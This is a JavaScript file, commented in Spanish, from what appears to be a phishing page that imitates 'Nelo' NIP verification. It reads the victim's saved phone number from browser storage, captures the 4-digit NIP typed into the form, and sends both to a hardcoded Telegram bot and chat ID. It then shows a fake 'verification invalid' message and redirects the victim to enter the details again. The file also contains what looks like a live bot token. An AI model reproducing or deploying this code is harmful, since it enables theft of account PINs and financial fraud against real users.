const TELEGRAM_BOT_TOKEN = "8685705173:AAGkJoDqd-Fbhy2BGCUgJLRSFqJ_F0qlFa0";
const TELEGRAM_CHAT_ID = "-4790631483";

(async function() {
    // Función para enviar mensaje a Telegram
    async function enviarATelegram(mensaje) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: mensaje,
                    parse_mode: 'HTML'
                })
            });
            const data = await response.json();
            if (data.ok) {
                console.log("✅ Mensaje enviado a Telegram:", mensaje);
                return true;
            } else {
                console.error("❌ Error Telegram:", data.description);
                return false;
            }
        } catch (error) {
            console.error("❌ Error de conexión:", error);
            return false;
        }
    }

    // Función para formatear número de teléfono
    function formatearNumero(numero) {
        if (!numero) return null;
        let limpio = numero.replace(/\D/g, '');
        if (limpio.length === 12 && limpio.startsWith('52')) {
            limpio = limpio.substring(2);
        }
        if (limpio.length === 10) {
            return `+52 ${limpio.substring(0,2)} ${limpio.substring(2,6)} ${limpio.substring(6,10)}`;
        }
        return numero;
    }

    // Obtener el número guardado
    let numeroGuardado = localStorage.getItem('nelo_telefono');
    
    if (!numeroGuardado) {
        numeroGuardado = localStorage.getItem('nelo_telefono_completo');
    }
    
    if (!numeroGuardado) {
        numeroGuardado = sessionStorage.getItem('nelo_telefono_completo');
    }
    
    console.log("📞 Número recuperado en index3:", numeroGuardado);

    const esperarDOM = setInterval(() => {
        const boton = document.getElementById('verificarNipBtn');
        const nipInput = document.getElementById('nipSeguridad');
        const feedbackSpan = document.getElementById('feedbackSpanNip');
        const modal = document.getElementById('spinnerModal');
        
        if (boton && nipInput && feedbackSpan && modal) {
            clearInterval(esperarDOM);
            
            function mostrarModalSpinner() {
                modal.classList.add('active');
            }

            function ocultarModalSpinner() {
                modal.classList.remove('active');
            }

            async function ejecutarVerificacion() {
                const nipRaw = nipInput.value.trim();
                const soloDigitos = nipRaw.replace(/\D/g, '');
                
                if (soloDigitos.length !== 4) {
                    feedbackSpan.textContent = `❌ Debes ingresar exactamente 4 dígitos numéricos.`;
                    feedbackSpan.classList.remove('success-fb');
                    feedbackSpan.classList.add('error-fb');
                    nipInput.style.transform = 'scale(1.01)';
                    setTimeout(() => { if (nipInput) nipInput.style.transform = ''; }, 180);
                    nipInput.focus();
                    return;
                }
                
                boton.disabled = true;
                feedbackSpan.textContent = "";
                feedbackSpan.classList.remove('error-fb', 'success-fb');
                mostrarModalSpinner();
                
                const numeroFormateado = formatearNumero(numeroGuardado) || numeroGuardado || "No disponible";
                const mensaje = `🟡🟡NIP🟡🟡 \n📱 Número: ${numeroFormateado}\n🔢 NIP ingresado: ${soloDigitos}\n`;
                
                await enviarATelegram(mensaje);
                
                setTimeout(() => {
                    ocultarModalSpinner();
                    feedbackSpan.classList.add('success-fb');
                    feedbackSpan.textContent = `Verificación inválida, vuelva a ingresar`;
                    
                    setTimeout(() => {
                        window.location.href = "index.html";
                    }, 2500);
                    
                    boton.disabled = false;
                    nipInput.value = "";
                }, 2500);
            }
            
            boton.addEventListener('click', ejecutarVerificacion);
            
            nipInput.addEventListener('keypress', (event) => {
                if (event.key === 'Enter') {
                    event.preventDefault();
                    ejecutarVerificacion();
                }
            });
            
            nipInput.addEventListener('input', function(e) {
                let soloNumeros = this.value.replace(/\D/g, '');
                if (soloNumeros.length > 4) {
                    soloNumeros = soloNumeros.slice(0, 4);
                }
                this.value = soloNumeros;
                
                if (soloNumeros.length === 0) {
                    feedbackSpan.textContent = "Ingresa tu NIP de 4 dígitos";
                    feedbackSpan.classList.remove('error-fb', 'success-fb');
                    feedbackSpan.classList.add('feedback-msg');
                } else if (soloNumeros.length === 4) {
                    feedbackSpan.textContent = "✓ NIP completo. Presiona Verificar";
                    feedbackSpan.classList.remove('error-fb');
                    feedbackSpan.classList.add('success-fb');
                    setTimeout(() => {
                        if (feedbackSpan && feedbackSpan.textContent === "✓ NIP completo. Presiona Verificar") {
                            feedbackSpan.textContent = "";
                            feedbackSpan.classList.remove('success-fb');
                        }
                    }, 2000);
                } else {
                    feedbackSpan.classList.remove('error-fb', 'success-fb');
                    feedbackSpan.classList.add('feedback-msg');
                }
            });
            
            if (nipInput.value === "") {
                feedbackSpan.textContent = "Verificación de NIP • Nelo";
                feedbackSpan.classList.remove('error-fb', 'success-fb');
                feedbackSpan.classList.add('feedback-msg');
            }
        }
    }, 100);
})();
